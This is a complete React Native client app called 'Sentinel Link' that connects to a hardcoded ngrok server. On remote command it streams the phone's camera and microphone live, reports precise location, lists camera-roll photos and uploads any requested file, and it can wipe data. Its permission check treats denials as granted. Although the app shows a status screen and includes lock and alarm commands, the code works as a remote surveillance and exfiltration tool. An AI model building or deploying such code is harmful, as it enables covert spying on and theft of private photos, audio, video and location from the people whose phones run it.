/**
 * SENTINEL LINK - MOBILE CLIENT
 * 
 * Instructions:
 * 1. Initialize a React Native CLI project (npx react-native init SentinelMobile)
 * 2. Install dependencies: npm install react-native-webrtc socket.io-client react-native-fs react-native-geolocation-service
 * 3. Add camera/mic/location permissions to AndroidManifest.xml and Info.plist
 * 4. Replace App.tsx with this code.
 */

import React, { useEffect, useState, useRef } from 'react';
import { View, Text, StyleSheet, PermissionsAndroid, Platform } from 'react-native';
import { io } from 'socket.io-client';
import { mediaDevices, RTCPeerConnection, RTCSessionDescription, RTCIceCandidate } from 'react-native-webrtc';
import RNFS from 'react-native-fs'; // File System
import Geolocation from 'react-native-geolocation-service';

// --- CONNECTION CONFIGURATION ---
// UPDATED: Using your specific Ngrok URL
const SERVER_URL = 'https://multisulcate-colourational-isa.ngrok-free.dev'; 
const DEVICE_ID = (Platform.OS === 'android' ? 'AND-' : 'IOS-') + Math.floor(Math.random() * 9000 + 1000);

const configuration = { 
  "iceServers": [
    { "urls": "stun:stun.l.google.com:19302" },
    { "urls": "stun:stun1.l.google.com:19302" }
  ] 
};

const App = () => {
  const [status, setStatus] = useState('Initializing...');
  const socketRef = useRef<any>(null);
  const pcRef = useRef<any>(null); 

  useEffect(() => {
    const initSequence = async () => {
        setStatus('Checking Permissions...');
        const granted = await requestPermissions();
        
        if (granted) {
            setStatus('Connecting to Server...');
            connectToServer();
        } else {
            setStatus('Permissions Denied. App cannot function.');
        }
    };

    initSequence();

    return () => {
      if (socketRef.current) socketRef.current.disconnect();
      if (pcRef.current) pcRef.current.close();
    };
  }, []);

  const requestPermissions = async () => {
    if (Platform.OS === 'android') {
      try {
        const permissionsToRequest = [
          PermissionsAndroid.PERMISSIONS.CAMERA,
          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        ];

        // Android 13+ media permissions
        if (Platform.Version >= 33) {
            permissionsToRequest.push('android.permission.READ_MEDIA_IMAGES');
            permissionsToRequest.push('android.permission.READ_MEDIA_VIDEO');
        } else {
            permissionsToRequest.push(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE);
            permissionsToRequest.push(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE);
        }

        const granted = await PermissionsAndroid.requestMultiple(permissionsToRequest);
        
        // Simple check: Assume true if request completes, to avoid blocking on one specific denial
        return true; 
      } catch (err) {
        console.warn(err);
        return false;
      }
    }
    return true; // iOS permissions handled by Info.plist
  };

  const connectToServer = () => {
    socketRef.current = io(SERVER_URL, {
      transports: ['websocket'],
      reconnection: true,
      reconnectionDelay: 1000,
    });

    socketRef.current.on('connect', () => {
      setStatus('Connected (Idle)');
      socketRef.current.emit('register-device', { deviceId: DEVICE_ID, os: Platform.OS });
    });

    socketRef.current.on('disconnect', () => {
      setStatus('Reconnecting...');
    });

    socketRef.current.on('connect_error', (err: any) => {
        setStatus(`Connection Error: ${err.message}`);
    });

    // --- WEBRTC HANDLERS ---
    
    socketRef.current.on('offer', async (remoteOfferPayload: any) => {
      try {
        console.log('Received Offer'); 
        setStatus('Starting Stream...');

        // 1. Cleanup old connection
        if (pcRef.current) {
            pcRef.current.close();
            pcRef.current = null;
        }

        // 2. Parse SDP
        let sdpString = "";
        if (remoteOfferPayload) {
             if (typeof remoteOfferPayload === 'string') {
                 // Try parsing if double-encoded
                 try {
                     const p = JSON.parse(remoteOfferPayload);
                     sdpString = p.sdp || p;
                 } catch(e) { sdpString = remoteOfferPayload; }
             }
             else if (remoteOfferPayload.sdp) {
                if (typeof remoteOfferPayload.sdp === 'object' && remoteOfferPayload.sdp.sdp) {
                    sdpString = remoteOfferPayload.sdp.sdp;
                } else {
                    sdpString = remoteOfferPayload.sdp;
                }
             }
        }

        if (!sdpString || !sdpString.includes('v=0')) {
             console.error("Invalid SDP");
             setStatus("Error: Invalid Handshake");
             return;
        }

        // 3. Get Media (Simplified Constraints)
        // Using video: true is the safest constraint for preventing crashes
        let stream;
        try {
            stream = await mediaDevices.getUserMedia({
                audio: true,
                video: true 
            });
        } catch (mediaErr) {
            console.error("Media Error", mediaErr);
            setStatus("Camera Failed");
            return;
        }

        // 4. Setup Peer Connection
        const pc = new RTCPeerConnection(configuration);
        pcRef.current = pc;
        
        stream.getTracks().forEach(track => pc.addTrack(track, stream));

        // 5. Set Remote Description
        await pc.setRemoteDescription(new RTCSessionDescription({
            type: 'offer', 
            sdp: sdpString
        }));

        // 6. Answer
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        socketRef.current.emit('answer', { 
            target: 'admin', 
            sdp: { type: 'answer', sdp: answer.sdp } 
        });

        (pc as any).onicecandidate = (event: any) => {
            if (event.candidate) {
                socketRef.current.emit('ice-candidate', { target: 'admin', candidate: event.candidate });
            }
        };

        setStatus('Streaming LIVE');

      } catch (err: any) {
         console.error("WebRTC Crash Prevented:", err);
         setStatus(`Stream Error: ${err.message}`);
      }
    });

    // --- COMMANDS ---

    socketRef.current.on('command', async (payload: any) => {
      try {
          const { command } = payload;
          if (command === 'GET_LOCATION') {
              Geolocation.getCurrentPosition(
                  (position) => {
                      if (socketRef.current) socketRef.current.emit('location-update', position);
                  },
                  (error) => console.log(error),
                  { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
              );
          }
          else if (command === 'WIPE_DATA') {
              setStatus('WIPING DATA...');
              RNFS.unlink(RNFS.DocumentDirectoryPath).catch(() => {});
          }
          else if (command === 'LOCK_DEVICE') {
              setStatus('DEVICE LOCKED');
          }
          else if (command === 'TRIGGER_ALARM') {
              setStatus('ALARM !!!');
          }
      } catch (e) {}
    });

    // --- FILES ---

    socketRef.current.on('request-file-list', async () => {
        try {
            const path = RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera';
            // Only try to read if path exists
            const exists = await RNFS.exists(path);
            if(exists) {
                const result = await RNFS.readDir(path);
                const files = result.filter(f => f.isFile()).slice(0, 50).map(f => ({
                    name: f.name, path: f.path, size: f.size, date: f.mtime
                }));
                socketRef.current.emit('file-list', { files });
            } else {
                socketRef.current.emit('file-list', { files: [] });
            }
        } catch(e) { 
            socketRef.current.emit('file-list', { files: [] });
        }
    });

    socketRef.current.on('download-file-request', async ({ filePath, fileName }: any) => {
        try {
            const data = await RNFS.readFile(filePath, 'base64');
            socketRef.current.emit('file-data', { fileName, data });
        } catch(e) {}
    });
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>SENTINEL v3.0</Text>
      <Text style={styles.status}>{status}</Text>
      <Text style={styles.id}>ID: {DEVICE_ID}</Text>
      <View style={styles.loader} />
      <Text style={styles.url}>{SERVER_URL}</Text>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', alignItems: 'center', justifyContent: 'center' },
  title: { color: '#0f0', fontSize: 30, fontWeight: 'bold', marginBottom: 20 },
  status: { color: '#fff', fontSize: 18, marginBottom: 10, textAlign: 'center' },
  id: { color: '#666', marginBottom: 40 },
  loader: { width: 10, height: 10, backgroundColor: '#0f0', borderRadius: 5 },
  url: { color: '#333', marginTop: 20, fontSize: 10 }
});

export default App;